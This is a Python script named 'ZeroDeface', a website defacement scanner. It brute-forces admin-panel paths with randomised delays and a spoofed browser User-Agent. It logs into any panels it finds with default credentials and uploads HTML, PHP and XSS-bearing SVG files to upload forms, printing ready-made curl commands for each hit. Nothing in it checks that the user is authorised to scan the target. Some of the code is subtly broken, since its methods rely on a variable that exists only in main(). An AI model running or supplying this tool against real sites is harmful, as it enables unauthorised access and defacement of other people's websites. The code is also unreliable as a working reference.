#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import json
from datetime import datetime
import sys
import random
import time

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

class DefacementScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        })
        self.vulnerabilities = []
        self.uploaded_files = []
        
        # Admin panel detection
        self.admin_paths = [
            'admin', 'wp-admin', 'administrator', 'backend', 
            'manager', 'panel', 'controlpanel', 'cpanel',
            'adminpanel', 'admincp', 'admin_area', 'moderator',
            'user/login', 'admin/login', 'admin/auth', 
            'bolt/login', 'concrete5/login', 'drupal/admin',
            'joomla/administrator', 'magento/admin', 
            'opencart/admin', 'prestashop/admin',
            '_admin', 'admin123', 'admin_area', 
            'admin1', 'admin2', 'admin4', 'admin5',
            'siteadmin', 'server-admin', 'webadmin', 'sysadmin',
            'wp-login.php', 'wp-admin/admin-ajax.php',
            'administrator/index.php', 'admin/login.aspx',
            'api/admin', 'rest/admin', 'graphql/admin'
        ]
        
        # File upload testing
        self.test_content = "ZERODEFACE_TEST_"
        self.test_patterns = [
            "DEFACED_BY_", "HACKED_BY", "SECURITY_TEST", 
            "VULNERABLE_TO_UPLOAD", "TEST_ID:", "ZERODEFACE"
        ]
        
        # Credentials
        self.default_credentials = {
            'generic': [('admin', 'admin'), ('admin', 'password')],
            'wordpress': [('admin', 'admin'), ('wpadmin', 'wpadmin')],
            'joomla': [('admin', 'admin'), ('superuser', 'superuser')],
            'drupal': [('admin', 'admin'), ('drupal', 'drupal')]
        }

    def print_banner(self):
        banner = r"""
__________                 ________          _____                     
\____    /___________  ____\______ \   _____/ ____\____    ____  ____  
  /     // __ \_  __ \/  _ \|    |  \_/ __ \   __\\__  \ _/ ___\/ __ \ 
 /     /\  ___/|  | \(  <_> )    `   \  ___/|  |   / __ \\  \__\  ___/ 
/_______ \___  >__|   \____/_______  /\___  >__|  (____  /\___  >___  >
        \/   \/                    \/     \/           \/     \/    \/ 
        """
        print("\033[1;31m" + banner + "\033[0m")
        print("\033[1;37mZeroDeface v2.0 - Website Defacement Scanner\033[0m")
        print("\033[1;33mEnhanced Admin Detection | Smart File Upload Tests\033[0m\n")

    def log_vulnerability(self, category, description, exploit=None, proof=None):
        vuln = {
            'category': category,
            'description': description,
            'timestamp': datetime.now().isoformat(),
            'exploit': exploit,
            'proof': proof
        }
        self.vulnerabilities.append(vuln)
        print(f"\033[1;31m[!] {category} found:\033[0m {description}")

    def crawl_for_forms(self):
        try:
            response = self.session.get(self.target_url, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[-] Error crawling for forms: {e}")
            return []

    def scan_admin_panels(self):
        print("[*] Scanning for admin panels...")
        found = False
        
        for path in self.admin_paths:
            admin_url = urljoin(self.target_url, path)
            try:
                time.sleep(random.uniform(0.3, 1.2))
                response = self.session.get(admin_url, verify=False, timeout=15)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if soup.find('input', {'type': 'password'}) or 'login' in response.text.lower():
                        self.log_vulnerability(
                            "Admin Panel Found",
                            f"Admin interface at {admin_url}",
                            exploit=f"Visit {admin_url}",
                            proof=response.text[:200] + "..."
                        )
                        found = True
                        
                        if self.test_default_credentials(admin_url):
                            return True
                            
            except Exception as e:
                if not args.quiet:
                    print(f"[-] Error checking {admin_url}: {str(e)[:50]}...")
        
        return found

    def test_default_credentials(self, login_url):
        print(f"[*] Testing default credentials at {login_url}")
        credentials = self.default_credentials['generic']
        
        for username, password in credentials:
            try:
                data = {'username': username, 'password': password, 'login': 'submit'}
                response = self.session.post(login_url, data=data, verify=False, timeout=15)
                
                if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                    self.log_vulnerability(
                        "Default Credentials",
                        f"Working credentials: {username}/{password}",
                        exploit=f"curl -X POST -d 'username={username}&password={password}' {login_url}",
                        proof=f"Logged in successfully to {login_url}"
                    )
                    return True
                    
            except Exception as e:
                continue
                
        return False

    def scan_upload_vulnerabilities(self):
        print("[*] Scanning for file upload vulnerabilities...")
        forms = self.crawl_for_forms()
        found = False
        
        for form in forms:
            if form.find('input', {'type': 'file'}):
                action = form.get('action', '') or self.target_url
                method = form.get('method', 'post').lower()
                
                if self.test_file_upload(form, action, method):
                    found = True
        
        # Check common upload paths
        common_upload_paths = ['upload', 'file-upload', 'upload-file', 'admin/upload']
        for path in common_upload_paths:
            upload_url = urljoin(self.target_url, path)
            try:
                response = self.session.get(upload_url, verify=False, timeout=10)
                if response.status_code == 200 and 'upload' in response.text.lower():
                    if self.test_upload_endpoint(upload_url):
                        found = True
            except:
                continue
                
        return found

    def test_file_upload(self, form, action_url, method='post'):
        test_files = [
            ('test.html', 'text/html', f'<html><body>{self.test_content}</body></html>'),
            ('test.php', 'application/x-php', '<?php echo "UPLOAD_TEST"; ?>'),
            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS")</script></svg>')
        ]
        
        for filename, content_type, content in test_files:
            try:
                files = {'file': (filename, content, content_type)}
                if method == 'post':
                    response = self.session.post(action_url, files=files, verify=False, timeout=15)
                else:
                    response = self.session.request(method, action_url, files=files, verify=False, timeout=15)
                
                if response.status_code in [200, 201, 302]:
                    file_url = urljoin(action_url, filename)
                    file_response = self.session.get(file_url, verify=False, timeout=10)
                    
                    if file_response.status_code == 200 and self.test_content in file_response.text:
                        self.log_vulnerability(
                            "File Upload Vulnerability",
                            f"File upload possible at {action_url} - {filename} accessible at {file_url}",
                            exploit=f"curl -F 'file=@{filename}' {action_url}",
                            proof=file_response.text[:500] + "..."
                        )
                        self.uploaded_files.append(file_url)
                        return True
                        
            except Exception as e:
                if args.verbose:
                    print(f"[-] Upload test failed for {filename}: {str(e)[:50]}...")
                
        return False

    def test_upload_endpoint(self, upload_url):
        return self.test_file_upload(None, upload_url)

    def generate_report(self, filename):
        report = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'uploaded_files': self.uploaded_files
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Report saved to {filename}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def cleanup(self):
        for file_url in self.uploaded_files:
            try:
                self.session.delete(file_url, verify=False, timeout=10)
                print(f"[*] Cleaned up test file at {file_url}")
            except:
                print(f"[-] Failed to clean up test file at {file_url}")

def main():
    parser = argparse.ArgumentParser(
        description='ZeroDeface v2.0 - Website Defacement Scanner',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('--url', required=True, help='Target URL to scan')
    parser.add_argument('--admin', action='store_true', help='Scan for admin panels')
    parser.add_argument('--upload', action='store_true', help='Test file upload vulnerabilities')
    parser.add_argument('--all', action='store_true', help='Run all scans')
    parser.add_argument('--report', help='Save results to JSON file')
    parser.add_argument('--verbose', action='store_true', help='Show detailed output')
    parser.add_argument('--quiet', action='store_true', help='Show only critical findings')
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    try:
        scanner = DefacementScanner(args.url)
        scanner.print_banner()
        
        if args.all or args.admin:
            scanner.scan_admin_panels()
            
        if args.all or args.upload:
            scanner.scan_upload_vulnerabilities()
            
        if args.report:
            scanner.generate_report(args.report)
            
        if not scanner.vulnerabilities:
            print("\033[1;32m[+] No vulnerabilities found.\033[0m")
            
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
    except Exception as e:
        print(f"\033[1;31m[-] Error: {e}\033[0m")
    finally:
        if 'scanner' in locals():
            scanner.cleanup()

if __name__ == '__main__':
    main()
